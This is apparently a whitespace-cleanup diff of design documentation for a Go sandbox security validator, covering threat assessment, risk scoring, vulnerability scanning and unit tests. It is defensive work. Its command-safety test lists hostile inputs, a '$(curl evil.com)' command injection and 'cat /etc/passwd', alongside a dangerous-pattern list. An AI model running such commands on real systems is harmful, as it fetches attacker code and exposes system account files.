@@ -11,19 +11,19 @@ The Security Validation Framework provides comprehensive threat assessment, risk
 ```mermaid
 graph TD
     A[Security Request] --> B[Threat Assessment]
-    A --> C[Control Evaluation] 
+    A --> C[Control Evaluation]
     A --> D[Vulnerability Scan]
     A --> E[Compliance Check]
-    
+
     B --> F[Risk Calculator]
     C --> F
     D --> F
     E --> F
-    
+
     F --> G{Risk Level}
     G -->|LOW/MEDIUM| H[Allow Execution]
     G -->|HIGH/CRITICAL| I[Block & Report]
-    
+
     H --> J[Monitor & Audit]
     I --> K[Security Alert]
     J --> L[Audit Log]
@@ -137,11 +137,11 @@ type ThreatAssessment struct {
     Controls     []string `json:"controls"`   // Active controls
 }
 
-func (sv *SecurityValidator) assessThreats(ctx context.Context, 
+func (sv *SecurityValidator) assessThreats(ctx context.Context,
     options AdvancedSandboxOptions) []ThreatAssessment {
-    
+
     var assessments []ThreatAssessment
-    
+
     for _, threat := range sv.threatModel.Threats {
         assessment := ThreatAssessment{
             ThreatID:    threat.ID,
@@ -149,14 +149,14 @@ func (sv *SecurityValidator) assessThreats(ctx context.Context,
             Impact:      sv.calculateImpact(threat, options),
             Probability: sv.calculateProbability(threat, options),
         }
-        
+
         // Evaluate active controls
         assessment.Controls = sv.getActiveControls(threat.ID, options)
         assessment.Mitigated = sv.isTheatMitigated(threat.ID, assessment.Controls)
-        
+
         assessments = append(assessments, assessment)
     }
-    
+
     return assessments
 }
 ```
@@ -183,7 +183,7 @@ func (sv *SecurityValidator) validateNonRootExecution(options AdvancedSandboxOpt
 ```
 
 #### C002: Read-only Root Filesystem
-**Type:** Preventive  
+**Type:** Preventive
 **Description:** Prevents modifications to the root filesystem.
 **Implementation:**
 ```go
@@ -218,7 +218,7 @@ func (sv *SecurityValidator) validateInputSafety(input string) bool {
         "<",            // Redirection
         ";",            // Command termination
     }
-    
+
     for _, pattern := range dangerousPatterns {
         if matched, _ := regexp.MatchString(pattern, input); matched {
             return false
@@ -260,7 +260,7 @@ type ControlEffectiveness struct {
 
 func (sv *SecurityValidator) evaluateControlEffectiveness(
     controlID string, options AdvancedSandboxOptions) ControlEffectiveness {
-    
+
     switch controlID {
     case "C001": // Non-root user
         active := sv.validateNonRootExecution(options)
@@ -295,7 +295,7 @@ Risk Score = Impact × Probability × (Mitigated ? 0.3 : 1.0)
 
 **Risk Levels:**
 - **CRITICAL**: Score ≥ 7.0
-- **HIGH**: Score ≥ 5.0  
+- **HIGH**: Score ≥ 5.0
 - **MEDIUM**: Score ≥ 3.0
 - **LOW**: Score < 3.0
 
@@ -326,11 +326,11 @@ func NewRiskCalculator() *RiskCalculator {
 
 func (rc *RiskCalculator) CalculateRisk(assessment ThreatAssessment) float64 {
     baseRisk := assessment.Impact * assessment.Probability
-    
+
     if assessment.Mitigated {
         return baseRisk * rc.mitigationFactor
     }
-    
+
     return baseRisk
 }
 
@@ -370,7 +370,7 @@ func initializeVulnerabilityDatabase() map[string]VulnerabilityInfo {
             Mitigations: []string{"C001", "C009"},
         },
         "VULN_002": {
-            ID:          "VULN_002", 
+            ID:          "VULN_002",
             Severity:    "MEDIUM",
             Description: "Writable root filesystem",
             Mitigations: []string{"C002"},
@@ -389,25 +389,25 @@ func initializeVulnerabilityDatabase() map[string]VulnerabilityInfo {
 ### Vulnerability Scanner
 
 ```go
-func (sv *SecurityValidator) scanVulnerabilities(ctx context.Context, 
+func (sv *SecurityValidator) scanVulnerabilities(ctx context.Context,
     options AdvancedSandboxOptions) []VulnerabilityInfo {
-    
+
     var vulnerabilities []VulnerabilityInfo
-    
+
     // Check for privileged execution
     if options.Privileged || options.User == "root" {
         if vuln, exists := sv.vulnDatabase["VULN_001"]; exists {
             vulnerabilities = append(vulnerabilities, vuln)
         }
     }
-    
+
     // Check for network access
     if options.SecurityPolicy.AllowNetworking {
         if vuln, exists := sv.vulnDatabase["VULN_003"]; exists {
             vulnerabilities = append(vulnerabilities, vuln)
         }
     }
-    
+
     // Check for dangerous capabilities
     for _, cap := range options.Capabilities {
         if sv.isDangerousCapability(cap) {
@@ -416,7 +416,7 @@ func (sv *SecurityValidator) scanVulnerabilities(ctx context.Context,
             }
         }
     }
-    
+
     return vulnerabilities
 }
 ```
@@ -450,30 +450,30 @@ type SecurityRecommendation struct {
 ### Report Generation
 
 ```go
-func (sv *SecurityValidator) ValidateSecurity(ctx context.Context, 
+func (sv *SecurityValidator) ValidateSecurity(ctx context.Context,
     sessionID string, options AdvancedSandboxOptions) (*SecurityValidationReport, error) {
-    
+
     sv.logger.Info().Str("session_id", sessionID).Msg("Starting security validation")
-    
+
     // Assess threats
     threats := sv.assessThreats(ctx, options)
-    
-    // Scan vulnerabilities  
+
+    // Scan vulnerabilities
     vulnerabilities := sv.scanVulnerabilities(ctx, options)
-    
+
     // Evaluate controls
     controls := sv.evaluateControls(ctx, options)
-    
+
     // Calculate overall risk
     riskScore := sv.calculateOverallRisk(threats)
     riskLevel := sv.getRiskLevel(riskScore)
-    
+
     // Generate recommendations
     recommendations := sv.generateRecommendations(threats, vulnerabilities, controls)
-    
+
     // Check compliance
     compliance := sv.checkCompliance(options)
-    
+
     report := &SecurityValidationReport{
         SessionID:        sessionID,
         Timestamp:        time.Now(),
@@ -485,9 +485,9 @@ func (sv *SecurityValidator) ValidateSecurity(ctx context.Context,
         Recommendations:  recommendations,
         ComplianceStatus: compliance,
     }
-    
+
     sv.auditSecurityValidation(report)
-    
+
     return report, nil
 }
 ```
@@ -500,7 +500,7 @@ func (sv *SecurityValidator) ValidateSecurity(ctx context.Context,
 ```go
 func TestSecureConfiguration(t *testing.T) {
     validator := NewSecurityValidator(zerolog.New(os.Stdout))
-    
+
     options := AdvancedSandboxOptions{
         User:  "1000",
         Group: "1000",
@@ -510,9 +510,9 @@ func TestSecureConfiguration(t *testing.T) {
         },
         Capabilities: []string{}, // No capabilities
     }
-    
+
     report, err := validator.ValidateSecurity(context.Background(), "test-session", options)
-    
+
     assert.NoError(t, err)
     assert.Equal(t, "LOW", report.RiskLevel)
     assert.True(t, report.RiskScore < 3.0)
@@ -523,7 +523,7 @@ func TestSecureConfiguration(t *testing.T) {
 ```go
 func TestInsecureConfiguration(t *testing.T) {
     validator := NewSecurityValidator(zerolog.New(os.Stdout))
-    
+
     options := AdvancedSandboxOptions{
         User:       "root",           // Root user - HIGH risk
         Group:      "root",
@@ -533,9 +533,9 @@ func TestInsecureConfiguration(t *testing.T) {
         },
         Capabilities: []string{"CAP_SYS_ADMIN"}, // Dangerous capability
     }
-    
+
     report, err := validator.ValidateSecurity(context.Background(), "test-session", options)
-    
+
     assert.NoError(t, err)
     assert.Equal(t, "CRITICAL", report.RiskLevel)
     assert.True(t, report.RiskScore >= 7.0)
@@ -546,7 +546,7 @@ func TestInsecureConfiguration(t *testing.T) {
 ```go
 func TestCommandSecurity(t *testing.T) {
     validator := NewSecurityValidator(zerolog.New(os.Stdout))
-    
+
     testCases := []struct {
         command  string
         expected bool
@@ -557,7 +557,7 @@ func TestCommandSecurity(t *testing.T) {
         {"$(curl evil.com)", false},        // Command injection
         {"cat /etc/passwd", false},         // Sensitive file access
     }
-    
+
     for _, tc := range testCases {
         result := validator.isCommandSafe(tc.command)
         assert.Equal(t, tc.expected, result, "Command: %s", tc.command)
@@ -570,20 +570,20 @@ func TestCommandSecurity(t *testing.T) {
 ```go
 func TestSecurityValidationIntegration(t *testing.T) {
     validator := NewSecurityValidator(zerolog.New(os.Stdout))
-    
+
     // Test development configuration
     devOptions := AdvancedSandboxOptions{
         User:         "1000",
-        Group:        "1000", 
+        Group:        "1000",
         Capabilities: []string{},
         SecurityPolicy: SecurityPolicy{
             AllowNetworking: false,
             RequireNonRoot:  true,
         },
     }
-    
+
     report, err := validator.ValidateSecurity(context.Background(), "dev-session", devOptions)
-    
+
     assert.NoError(t, err)
     assert.NotNil(t, report)
     assert.Contains(t, []string{"LOW", "MEDIUM"}, report.RiskLevel)
@@ -606,7 +606,7 @@ func TestSecurityValidationIntegration(t *testing.T) {
 ```go
 func (sv *SecurityValidator) ValidateSecurityWithMetrics(ctx context.Context,
     sessionID string, options AdvancedSandboxOptions) (*SecurityValidationReport, error) {
-    
+
     start := time.Now()
     defer func() {
         duration := time.Since(start)
@@ -615,7 +615,7 @@ func (sv *SecurityValidator) ValidateSecurityWithMetrics(ctx context.Context,
             Dur("duration", duration).
             Msg("Security validation completed")
     }()
-    
+
     return sv.ValidateSecurity(ctx, sessionID, options)
 }
 ```
